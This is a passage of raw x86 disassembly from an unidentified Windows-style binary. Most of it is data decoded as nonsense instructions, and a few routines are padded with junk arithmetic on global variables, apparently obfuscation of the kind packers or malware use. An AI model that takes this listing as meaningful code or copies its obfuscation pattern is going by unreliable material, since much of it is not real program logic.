  408263:	js     0x40825c
  408265:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408267:	inc    esp
  408268:	push   0x3e
  40826a:	mov    esi,0x4715e67b
  40826f:	cmp    ecx,0x71ee0f0b
  408275:	or     al,0xb
  408277:	pop    ss
  408278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408279:	sar    BYTE PTR [edi],1
  40827b:	mov    edi,0x6b2e2c85
  408280:	fs (bad) 
  408282:	cmp    ah,ah
  408284:	sub    cl,BYTE PTR [esi]
  408286:	xchg   esi,eax
  408287:	jg     0x408212
  408289:	sub    DWORD PTR [ebx-0x24],edx
  40828c:	jae    0x40824d
  40828e:	outs   dx,BYTE PTR ds:[esi]
  40828f:	dec    ecx
  408290:	pop    edi
  408291:	add    eax,0xbbc536f7
  408296:	out    0x8a,eax
  408298:	lods   eax,DWORD PTR ds:[esi]
  408299:	push   eax
  40829a:	xchg   dh,dl
  40829c:	fcom   DWORD PTR ss:[ecx+0x37]
  4082a0:	shl    DWORD PTR [eax+0x7e],cl
  4082a3:	mov    ebx,0x84c9cf14
  4082a8:	jbe    0x408233
  4082aa:	push   DWORD PTR [eax+esi*4+0x51]
  4082ae:	adc    dh,al
  4082b0:	mov    ch,0x5f
  4082b2:	xchg   esp,eax
  4082b3:	pop    edi
  4082b4:	xchg   ebp,eax
  4082b5:	test   al,0x19
  4082b7:	jl     0x40830e
  4082b9:	rol    BYTE PTR [ebx],0x1b
  4082bc:	and    WORD PTR [ebp+ebx*8-0x33083ce9],bx
  4082c4:	int    0x3f
  4082c6:	inc    esi
  4082c7:	or     DWORD PTR [esi+0x75],0xe8312757
  4082ce:	mov    edi,?
  4082d0:	xchg   edi,eax
  4082d1:	mov    dh,0x66
  4082d3:	sub    eax,0x767f535c
  4082d8:	ss sbb DWORD PTR cs:[eax],ebx
  4082dc:	sub    al,0x7f
  4082de:	leave  
  4082df:	rcl    BYTE PTR [ecx],cl
  4082e1:	imul   eax,DWORD PTR [edx],0x13
  4082e4:	sub    ebx,DWORD PTR [eax-0x43]
  4082e7:	xchg   ebx,eax
  4082e8:	(bad)  
  4082ea:	loope  0x40834c
  4082ec:	clc    
  4082ed:	add    DWORD PTR [ebp+0x1240ea78],esi
  4082f3:	push   ss
  4082f4:	jno    0x408342
  4082f6:	cmc    
  4082f7:	cmp    ecx,DWORD PTR [ecx]
  4082f9:	dec    ecx
  4082fa:	sub    DWORD PTR [edx+0x19c9501e],0x7c
  408301:	inc    esi
  408302:	dec    ecx
  408303:	sub    BYTE PTR [eax],dl
  408305:	(bad)  
  408306:	daa    
  408307:	xchg   esi,eax
  408308:	add    al,0x5c
  40830a:	xor    DWORD PTR [ebx+edx*1-0x7f46ec88],esi
  408311:	jmp    0x2348:0x137548b6
  408318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408319:	lods   eax,DWORD PTR ds:[esi]
  40831a:	and    eax,0x9e9febb7
  40831f:	fs inc esp
  408321:	retf   
  408322:	fwait
  408323:	adc    al,0x83
  408325:	ficomp DWORD PTR ds:0xb75e9d69
  40832b:	push   cs
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e772
  408366:	adc    DWORD PTR ds:0x42e762,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430542,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e76e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e76e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4304a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43048a
  4083aa:	or     DWORD PTR ds:0x42ee0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43048e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e766,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43049a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e776,0x42e76e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e76e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43048e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43048e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43048e,esi
  408424:	cmp    DWORD PTR ds:0x43048e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea08
  40844d:	cmp    DWORD PTR ds:0x43048e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	dec    esp
  40847e:	add    al,0x85
  408480:	es popa 
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408464
  40848a:	(bad)  
  40848b:	adc    ebp,DWORD PTR [ebp+0x57]
  40848e:	or     eax,0xdb0499d5
  408493:	loope  0x408436
  408495:	pusha  
  408496:	in     eax,dx
  408497:	mov    BYTE PTR [ebx],bh
  408499:	mov    esp,0x7052b522
  40849e:	nop
  40849f:	mov    bh,0x28
  4084a1:	mov    ss,esi
  4084a3:	ss ja  0x4084da
  4084a6:	mov    ds,WORD PTR [ecx-0x6189ba27]
  4084ac:	mov    ebx,0x806b49c5
  4084b1:	std    
  4084b2:	into   
  4084b3:	sti    
  4084b4:	adc    cl,BYTE PTR [ecx]
  4084b6:	push   ds
  4084b7:	into   
  4084b8:	arpl   WORD PTR [esi-0x19],cx
  4084bb:	jbe    0x408487
  4084bd:	repz repz (bad) 
  4084c0:	cmc    
  4084c1:	cmp    al,0x8b
  4084c3:	int3   
  4084c4:	push   eax
  4084c5:	aad    0x7a
  4084c7:	inc    edi
  4084c8:	and    eax,0xb980f6ce
  4084cd:	ss into 
  4084cf:	fcomip st,st(1)
  4084d1:	jle    0x4084c4
  4084d3:	adc    DWORD PTR [eax+0x3cff618a],eax
  4084d9:	push   es
  4084da:	loop   0x4084b0
  4084dc:	and    BYTE PTR [eax+0x1e],ch
  4084df:	(bad)  
  4084e0:	cmc    
  4084e1:	call   0x873f:0x2e6cdc81
  4084e8:	cld    
  4084e9:	pop    ds
  4084ea:	or     eax,DWORD PTR [ebp+esi*2-0x4b60af3b]
  4084f1:	lods   eax,DWORD PTR ds:[esi]
  4084f2:	aas    
  4084f3:	in     al,dx
  4084f4:	fld    DWORD PTR [ebp+eax*4+0x78c1ed7c]
  4084fb:	add    eax,0xb29f3c54
  408500:	mov    ah,BYTE PTR [ebp-0x50]
  408503:	in     al,dx
  408504:	push   0x17
  408506:	hlt    
  408507:	inc    esi
  408508:	or     cl,BYTE PTR [edx-0x62]
  40850b:	sbb    BYTE PTR [edx],dh
  40850d:	dec    esp
  40850e:	pop    esp
  40850f:	ss ja  0x408520
  408512:	popa   
  408513:	clc    
  408514:	cmp    al,0xa1
  408516:	inc    edi
  408517:	add    edx,DWORD PTR [edi+0x41efc4f3]
  40851d:	les    edi,FWORD PTR [edx+esi*8+0x2ddc5af4]
  408524:	dec    edi
  408525:	fwait
  408526:	jmp    0xa4db3951
  40852b:	in     eax,dx
  40852c:	rol    BYTE PTR [edi+0x1f37c57c],0x39
  408533:	fdivp  st(1),st
  408535:	adc    bh,BYTE PTR [edx]
  408537:	in     al,0x82
  408539:	leave  
  40853a:	push   edx
  40853b:	repnz out 0xb8,eax
  40853e:	mov    bl,0x6c
  408540:	leave  
  408541:	scas   eax,DWORD PTR es:[edi]
  408542:	mov    ebx,0xc7335c61
  408547:	jo     0x408562
  408549:	ret    0xccab
  40854c:	rol    BYTE PTR [esi-0x10],1
  40854f:	ret    0xd2d
  408552:	adc    eax,0x619418f2
  408557:	xchg   ebp,eax
  408558:	dec    DWORD PTR [ebx]
  40855a:	loope  0x4084ed
  40855c:	mov    al,0x1b
  40855e:	adc    al,0x92
  408560:	pop    eax
  408561:	test   al,0x69
  408563:	mov    esi,0xd7e604e5
  408568:	push   esp
  408569:	jmp    0xab5a08ad
  40856e:	(bad)  
  40856f:	mov    cl,0x1e
  408571:	and    DWORD PTR [edi],edi
  408573:	mov    ecx,edi
  408575:	mov    ds:0xb105197b,eax
  40857a:	(bad)  
  40857b:	lods   eax,DWORD PTR ds:[esi]
  40857c:	pop    ebp
  40857d:	leave  
  40857e:	pusha  
  40857f:	mov    fs,WORD PTR [edi-0x64]
  408582:	dec    esp
  408583:	stc    
  408584:	stc    
  408585:	cmp    bh,BYTE PTR [eax+esi*1-0x4]
  408589:	ror    BYTE PTR [ebx-0x59],0xf4
  40858d:	add    DWORD PTR [edi],edi
  40858f:	push   ecx
  408590:	inc    ebx
  408591:	inc    esi
  408592:	pop    ebx
  408593:	js     0x40853a
  408595:	sub    al,bh
  408597:	jbe    0x4085df
  408599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40859a:	pop    ebx
  40859b:	add    DWORD PTR ds:[ebx+0x7a75eaaf],edi
  4085a2:	inc    ecx
  4085a3:	xchg   edx,eax
  4085a4:	pop    es
  4085a5:	or     ch,BYTE PTR [ebx+0x2ffcbac9]
  4085ab:	xor    BYTE PTR [ecx-0x245ef272],al
  4085b1:	jbe    0x408610
  4085b3:	mov    DWORD PTR [ebp-0x11],ebp
  4085b6:	repnz xchg ebp,eax
  4085b8:	mov    al,0x50
  4085ba:	pop    esp
  4085bb:	or     al,0xad
  4085bd:	dec    edx
  4085be:	push   ebx
  4085bf:	arpl   WORD PTR [ebx-0x2c27d825],di
  4085c5:	inc    DWORD PTR [edi]
  4085c7:	dec    edx
  4085c8:	ins    DWORD PTR es:[edi],dx
  4085c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ca:	jo     0x4085b0
  4085cc:	ss enter 0x65db,0x64
  4085d1:	mov    bl,0x4a
  4085d3:	push   ebx
  4085d4:	mov    edx,0x5d66a1ee
  4085d9:	leave  
  4085da:	cs push ebp
  4085dc:	icebp  
  4085dd:	jae    0x4085b3
  4085df:	inc    DWORD PTR [ecx]
  4085e1:	jle    0x408610
  4085e3:	push   edx
  4085e4:	mov    ebp,DWORD PTR [edi+ebx*4]
  4085e7:	inc    esi
  4085e8:	(bad)  
  4085e9:	push   ebp
  4085ea:	dec    ecx
  4085eb:	cld    
  4085ec:	jno    0x40856e
  4085ee:	and    al,0xf0
  4085f0:	jnp    0x408612
  4085f2:	push   ss
  4085f3:	jl     0x4085fc
  4085f5:	loopne 0x408578
  4085f7:	ret    0xbdaa
  4085fa:	sub    BYTE PTR [esi-0x72],cl
  4085fd:	scas   eax,DWORD PTR es:[edi]
  4085fe:	xchg   edx,eax
  4085ff:	mov    esp,0xefcf3dc9
  408604:	shr    DWORD PTR [ecx-0x3],1
  408607:	repz in al,0x49
  40860a:	xchg   edx,eax
  40860b:	pop    ecx
  40860c:	push   0xffffff88
  40860e:	adc    al,BYTE PTR [eax+0x3e854b7a]
  408614:	cmp    al,BYTE PTR [ecx]
  408616:	fwait
  408617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408618:	push   es
  408619:	fiadd  WORD PTR [ecx+edx*1+0xe]
  40861d:	icebp  
  40861e:	inc    edi
  40861f:	pop    ebp
  408620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408621:	push   eax
  408622:	mov    al,ds:0xaed44e92
  408627:	loop   0x408699
  408629:	sub    al,0x5e
  40862b:	(bad)  
  40862d:	xchg   BYTE PTR [eax-0x7f],cl
  408630:	xchg   ebp,eax
  408631:	movups XMMWORD PTR [ecx],xmm1
  408634:	mov    bl,0x75
  408636:	stos   BYTE PTR es:[edi],al
  408637:	mov    eax,0xebf056c5
  40863c:	mov    ebx,0xa1aad5e5
  408641:	jns    0x40868f
  408643:	retf   
  408644:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  408646:	popf   
  408647:	mov    ch,0x5f
  408649:	sub    edx,ebx
  40864b:	retf   
  40864c:	xchg   edi,eax
  40864d:	pop    edx
  40864e:	sbb    esi,esp
  408650:	add    DWORD PTR [esp+eiz*8-0xdc89e6e],esi
  408657:	mov    edx,0xaeae5ebc
  40865c:	mov    ds:0x9c6acc33,al
  408661:	mov    ecx,0x8d085b27
  408666:	push   es
  408667:	(bad)  
  408669:	call   0xcb2c:0xcf7edde9
  408670:	jae    0x40861c
  408672:	cld    
  408673:	out    dx,al
  408674:	jmp    0xf5eb6baa
  408679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40867a:	jge    0x40861f
  40867c:	mov    ebx,DWORD PTR [ecx+ecx*8-0x51]
  408680:	xchg   DWORD PTR [esp+ebx*8],edi
  408683:	int3   
  408684:	or     BYTE PTR [edi-0x30],dl
  408687:	ds push ecx
  408689:	fisttp WORD PTR [ebp+eiz*8+0x6891a2d4]
  408690:	in     eax,0x36
  408692:	lods   eax,DWORD PTR ds:[esi]
  408693:	loop   0x4086c9
  408695:	aam    0x89
  408697:	inc    esi
  408698:	mov    ecx,0x931f0ea2
  40869d:	cmp    al,0x47
  40869f:	ror    BYTE PTR [ebx+edi*1-0x44],1
  4086a3:	xor    edx,DWORD PTR [esi]
  4086a5:	aas    
  4086a6:	mov    ah,0x8c
  4086a8:	aas    
  4086a9:	jno    0x408679
  4086ab:	cmp    al,0x37
  4086ad:	xchg   esi,eax
  4086ae:	(bad)  
  4086af:	(bad)  
  4086b0:	call   0xb0c:0xae8ef8e0
  4086b7:	rcr    BYTE PTR [edx+0x541a380],0x2
  4086be:	jp     0x4086c4
  4086c0:	push   ebp
  4086c1:	ret    
  4086c2:	or     ebp,ebp
  4086c4:	dec    ebp
  4086c5:	mov    ds:0xc33dc93f,eax
  4086ca:	std    
  4086cb:	cmp    BYTE PTR [ebx-0xd8ae0c7],0xbb
  4086d2:	mov    WORD PTR [esi+0x60620beb],cs
  4086d8:	pusha  
  4086d9:	mov    al,0x66
  4086db:	inc    ecx
  4086dc:	and    BYTE PTR [eax-0x259b38c2],bh
  4086e2:	out    dx,eax
  4086e3:	ja     0x408729
  4086e5:	sti    
  4086e6:	sbb    BYTE PTR [esi-0x61],bl
  4086e9:	in     al,dx
  4086ea:	mov    eax,ds:0x7e8f378a
  4086ef:	fcom   DWORD PTR [edx-0x7bb47011]
  4086f5:	aad    0xeb
  4086f7:	mov    eax,0xf7c21f52
  4086fc:	loopne 0x408741
  4086fe:	std    
  4086ff:	mov    WORD PTR [ecx],?
  408701:	div    BYTE PTR [ebx]
  408703:	pusha  
  408704:	mov    dl,0x7
  408706:	jbe    0x4086ef
  408708:	inc    ecx
  408709:	neg    BYTE PTR [ebp-0x4d]
  40870c:	mov    ebx,0xe4eb7c2a
  408711:	es inc si
  408714:	add    eax,DWORD PTR [eax+0x4bac1e18]
  40871a:	pop    ebp
  40871b:	int3   
  40871c:	lods   eax,DWORD PTR ds:[esi]
  40871d:	rol    DWORD PTR [ecx+0x6607e10],1
  408723:	(bad)  
  408724:	cmp    BYTE PTR [edi-0x6d],bh
  408727:	retf   0x1d46
  40872a:	enter  0x5543,0xaa
  40872e:	cmp    eax,0x2cdaa512
  408733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408735:	(bad)  
  408737:	pop    es
  408738:	test   al,0x35
  40873a:	jnp    0x40873f
  40873c:	jecxz  0x40871d
  40873e:	mov    ch,0x6
  408740:	aam    0x5a
  408742:	pusha  
  408743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408744:	sbb    al,0x3b
  408746:	loopne 0x40877d
  408748:	push   eax
  408749:	or     al,0x68
  40874b:	ja     0x4087a2
  40874d:	cmp    ah,0x43
  408750:	push   edx
  408751:	(bad)  
  408753:	pop    ebp
  408754:	out    dx,al
  408755:	je     0x4087a0
  408757:	fisttp QWORD PTR [esi+0x24b2d94f]
  40875d:	dec    esp
  40875e:	add    ebp,DWORD PTR [bx+si+0x2b]
  408762:	xchg   ecx,eax
  408763:	mov    BYTE PTR [edi+0x3ac6b3ed],bh
  408769:	inc    ebx
  40876a:	in     eax,0x33
  40876c:	sar    BYTE PTR [ecx+0x7264fcad],cl
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	(bad)  
  40878a:	fnstenv [edi+edx*1]
  40878d:	nop
  40878e:	inc    ebx
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408801
  408797:	mov    ds:0x8a3bf9e3,al
  40879c:	mov    ch,0x94
  40879e:	loop   0x408721
  4087a0:	loopne 0x40878a
  4087a2:	int3   
  4087a3:	and    eax,0xf908d96
  4087a8:	mov    dl,BYTE PTR [eax-0x1fd654d3]
  4087ae:	mov    esi,edi
  4087b0:	add    al,0x1f
  4087b2:	lea    edi,[ebx]
  4087b4:	pop    ss
  4087b5:	iret   
  4087b6:	imul   ebx,DWORD PTR [esi+ecx*2+0x55],0x5f
  4087bb:	cmc    
  4087bc:	jp     0x408772
  4087be:	mov    al,ds:0x82686d6c
  4087c3:	xchg   edx,eax
  4087c4:	(bad)  
  4087c5:	xor    al,0x1e
  4087c7:	sub    al,0xf6
  4087c9:	push   ds
  4087ca:	fcmovbe st,st(5)
  4087cc:	xchg   ecx,eax
  4087cd:	rol    DWORD PTR [ecx+0x6a],1
  4087d0:	push   edx
  4087d1:	in     al,0x83
  4087d3:	in     al,dx
  4087d4:	cld    
  4087d5:	je     0x4087ee
  4087d7:	test   BYTE PTR [ebx],0xa7
  4087da:	dec    esp
  4087db:	cli    
  4087dc:	neg    DWORD PTR [ebx+0x552aa16d]
  4087e2:	test   eax,0x787be389
  4087e7:	xlat   BYTE PTR ds:[ebx]
  4087e8:	es js  0x4087c5
  4087eb:	mov    esi,esi
  4087ed:	jmp    0x6340:0x6a749ca4
  4087f4:	sbb    al,0x32
  4087f6:	mov    edi,0x5b7aa987
  4087fb:	addr16 dec edi
  4087fd:	xchg   ecx,eax
  4087fe:	mov    ecx,0x45c61c5
  408803:	pop    ebp
  408804:	ret    0xe444
  408807:	loope  0x4087a8
  408809:	test   al,0x4a
  40880b:	fwait
  40880c:	adc    BYTE PTR [ebp-0x22],ah
  40880f:	outs   dx,BYTE PTR ds:[esi]
  408810:	in     al,dx
  408811:	std    
  408812:	sbb    dh,cl
  408814:	inc    esi
  408815:	pop    ecx
  408816:	xchg   DWORD PTR [ebx+0x33],ebp
  408819:	bound  edi,QWORD PTR [ebp+ebx*8-0x57c73bbe]
  408820:	and    DWORD PTR [ebx],esi
  408822:	or     bl,ch
  408824:	loopne 0x408863
  408826:	(bad)  
  408827:	das    
  408828:	add    BYTE PTR [ebp+eax*2+0x7399d83f],ch
  40882f:	mov    ebx,gs
  408831:	or     eax,0xc79c322
  408836:	std    
  408837:	xor    esi,esi
  408839:	inc    esp
  40883a:	in     eax,dx
  40883b:	push   ecx
  40883c:	test   eax,0xff0d8ba7
  408841:	jmp    0x142e1107
  408846:	jmp    0xd735:0xf62bcab4
  40884d:	in     eax,0xd2
  40884f:	push   edx
  408850:	dec    eax
  408851:	add    BYTE PTR [eax-0x14ce937e],0xea
  408858:	enter  0x9b43,0x9d
  40885c:	push   cs
  40885d:	loope  0x4088c4
  40885f:	outs   dx,DWORD PTR ds:[esi]
  408860:	jle    0x4087e2
  408862:	mov    edx,0x4f9ceed7
  408867:	and    dh,cl
  408869:	xchg   ecx,eax
  40886a:	shl    dh,0x25
  40886d:	pushf  
  40886e:	and    bh,al
  408870:	xchg   ebx,eax
  408871:	cmp    eax,0x78e84d2e
  408876:	mov    DWORD PTR [ecx-0x29a116c3],eax
  40887c:	fadd   DWORD PTR [ebx]
  40887e:	out    dx,eax
  40887f:	es jmp 0x8dac11ea
  408885:	sub    al,BYTE PTR [edx+0x456d737e]
  40888b:	jmp    0xeab4989b
  408890:	int3   
  408891:	das    
  408892:	adc    BYTE PTR [eax],ch
  408894:	lea    esp,[edx+edi*2]
  408897:	addr16 es das 
  40889a:	pop    ecx
  40889b:	repz pop eax
  40889d:	or     DWORD PTR [edx],0xb666a0e6
  4088a3:	dec    esp
  4088a4:	lods   al,BYTE PTR es:[esi]
  4088a6:	ins    DWORD PTR es:[di],dx
  4088a8:	mov    dl,0x2f
  4088aa:	jg     0x4088c0
  4088ac:	push   ecx
  4088ad:	xor    bh,BYTE PTR [edx-0x630ba7fd]
  4088b3:	adc    DWORD PTR [esi+0x1],0x1d63ff78
  4088ba:	dec    BYTE PTR gs:[ebp+0x3558c8a9]
  4088c1:	cli    
  4088c2:	dec    esi
  4088c3:	dec    eax
  4088c4:	imul   BYTE PTR [ebx+ebp*2+0x1a50a27b]
  4088cb:	mov    dh,0xaf
  4088cd:	xchg   edi,eax
  4088ce:	cwde   
  4088cf:	adc    al,0x8
  4088d1:	scas   al,BYTE PTR es:[edi]
  4088d2:	imul   BYTE PTR [edx-0x4e56c1f6]
  4088d8:	sti    
  4088d9:	jg     0x40887d
  4088db:	push   es
  4088dc:	xor    edi,DWORD PTR [ebp+ecx*2+0x12e2675]
  4088e3:	div    ch
  4088e5:	cwde   
  4088e6:	fwait
  4088e7:	pop    ss
  4088e8:	cmp    BYTE PTR [ebx+0x7db67d08],dl
  4088ee:	bound  ebp,QWORD PTR [edx+0x3f66df54]
  4088f4:	mov    ecx,0xa0170459
  4088f9:	lea    edx,[ecx+0x77]
  4088fc:	cmp    al,0x5a
  4088fe:	loope  0x408916
  408900:	out    dx,al
  408901:	push   esp
  408902:	xor    dl,bh
  408904:	sbb    DWORD PTR [edi-0x2adec4ae],edi
  40890a:	push   esi
  40890b:	pop    ebx
  40890c:	iret   
  40890d:	mov    al,0x6f
  40890f:	ffree  st(4)
  408911:	push   ecx
  408912:	dec    eax
  408913:	push   eax
  408914:	int3   
  408915:	fld    TBYTE PTR [edx+0x4e]
  408918:	int3   
  408919:	std    
  40891a:	dec    esp
  40891b:	jno    0x408994
  40891d:	and    eax,0x6d164f37
  408922:	repnz cwde 
  408924:	(bad)  [edi]
  408926:	lock into 
  408928:	and    al,0xc2
  40892a:	adc    al,0xab
  40892c:	ja     0x408977
  40892e:	dec    dl
  408930:	xor    al,0x69
  408932:	cmp    DWORD PTR [eax],esi
  408934:	add    ebp,eax
  408936:	dec    esi
  408937:	addr16 jns 0x4089b0
  40893a:	into   
  40893b:	aaa    
  40893c:	mov    BYTE PTR [esi+0x32],ah
  40893f:	(bad)  
  408940:	adc    BYTE PTR [edi+ebx*2],dl
  408943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408944:	data16 fld DWORD PTR [edi+0x6be8bfe1]
  40894b:	sbb    DWORD PTR [edi+0xa],esp
  40894e:	shr    DWORD PTR [ecx-0x11e95b9a],1
  408954:	sub    dh,BYTE PTR [ebp+0x31f9134f]
  40895a:	mov    dh,0x43
  40895c:	sub    ch,BYTE PTR [esp+eiz*4+0x45]
  408960:	push   ds
  408961:	jmp    0x4089d3
  408963:	mov    gs,WORD PTR [ecx+0x5b501640]
  408969:	pushf  
  40896a:	adc    DWORD PTR [edi],ebp
  40896c:	adc    al,0xe4
  40896e:	repnz sbb bh,dl
  408971:	ins    DWORD PTR es:[edi],dx
  408972:	push   ebx
  408973:	out    dx,al
  408974:	mov    eax,ds:0x22f7811a
  408979:	jae    0x4088ff
  40897b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40897c:	daa    
  40897d:	fidivr WORD PTR [eax-0x4a6770cb]
  408983:	(bad)  
  408984:	ror    cl,cl
  408986:	mov    al,ds:0x50065988
  40898b:	rcl    BYTE PTR [ecx],1
  40898d:	outs   dx,DWORD PTR ds:[esi]
  40898e:	repz rol BYTE PTR [edi+edi*8-0x113df13d],cl
  408996:	in     al,dx
  408997:	pop    ecx
  408998:	adc    al,0x3c
  40899a:	add    eax,0xec33b37d
  40899f:	fist   WORD PTR [ebx]
  4089a1:	jg     0x408974
  4089a3:	fs retf 
  4089a5:	(bad)  
  4089a6:	adc    bh,BYTE PTR [esi]
  4089a8:	adc    BYTE PTR [ecx+0x547f08e9],ch
  4089ae:	cmc    
  4089af:	sbb    BYTE PTR [edx],dl
  4089b1:	dec    ebx
  4089b2:	aad    0x4b
  4089b4:	fst    QWORD PTR [ecx-0x7d]
  4089b7:	jb     0x4089cd
  4089b9:	repnz inc edi
  4089bb:	cmp    eax,0x42f6dcdb
  4089c0:	push   esi
  4089c1:	mov    edx,0x96486fac
  4089c6:	adc    eax,0xab512c79
  4089cb:	in     al,dx
  4089cc:	loopne 0x408996
  4089ce:	ret    0xd2ff
  4089d1:	mov    WORD PTR [eax+edx*2+0x56],?
  4089d5:	cdq    
  4089d6:	jl     0x408a4b
  4089d8:	add    edx,edx
  4089da:	add    al,0x4f
  4089dc:	add    dh,BYTE PTR [ebx+0x1f]
  4089df:	into   
  4089e0:	sub    al,0xca
  4089e2:	jbe    0x408a3b
  4089e4:	jmp    0x408a02
  4089e6:	gs xor al,0xd8
  4089e9:	sub    eax,0x721c0cc8
  4089ee:	xor    ecx,ecx
  4089f0:	iret   
  4089f1:	imul   edx,DWORD PTR [edi+0x49],0xffffffe7
  4089f5:	shl    BYTE PTR [ecx-0x763346c],cl
  4089fb:	cwde   
  4089fc:	inc    edx
  4089fd:	push   0x6d6f555e
  408a02:	fdivr  QWORD PTR [ecx+0x73]
  408a05:	adc    al,0x62
  408a07:	inc    ebp
  408a08:	out    dx,al
  408a09:	sbb    eax,0xf79b6346
  408a0e:	and    esi,DWORD PTR [ebp+0x75]
  408a11:	pop    es
  408a12:	jle    0x408a49
  408a14:	inc    edx
  408a15:	inc    esi
  408a16:	mov    ebx,0x6dc18cb
  408a1b:	imul   edi,esi,0xf44732d5
  408a21:	les    esi,FWORD PTR gs:[ecx+edi*1-0x4f]
  408a26:	fisttp QWORD PTR [eax+0x54f0a984]
  408a2c:	jmp    0xcb31:0x7219b015
  408a33:	ins    DWORD PTR es:[edi],dx
  408a34:	sahf   
  408a35:	mov    WORD PTR [edx-0x1f5670d3],?
  408a3b:	in     eax,dx
  408a3c:	mov    eax,ds:0x4ca4d0ee
  408a41:	xchg   ebp,eax
  408a42:	(bad)  
  408a43:	mov    eax,ds:0x4de438c6
  408a48:	fwait
  408a49:	popa   
  408a4a:	mov    DWORD PTR [eax+0x29e618ea],edi
  408a50:	jno    0x408a07
  408a52:	icebp  
  408a53:	loopne 0x408a12
  408a55:	fcomp  DWORD PTR [esi]
  408a57:	loope  0x408a35
  408a59:	fidivr DWORD PTR [edx+0x27adbb14]
  408a5f:	aas    
  408a60:	test   eax,0x8c825fe
  408a65:	and    DWORD PTR [edx+0x67f57914],eax
  408a6b:	fimul  WORD PTR [ecx+0x2d90e2d6]
  408a71:	sbb    al,0x53
  408a73:	(bad)  
  408a74:	cmc    
  408a75:	and    BYTE PTR ds:0x8fc98168,0x1d
  408a7c:	push   ss
  408a7d:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e76a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e76a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e76a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430496
  408ab1:	push   0x42ee30
  408ab6:	push   0x69fb
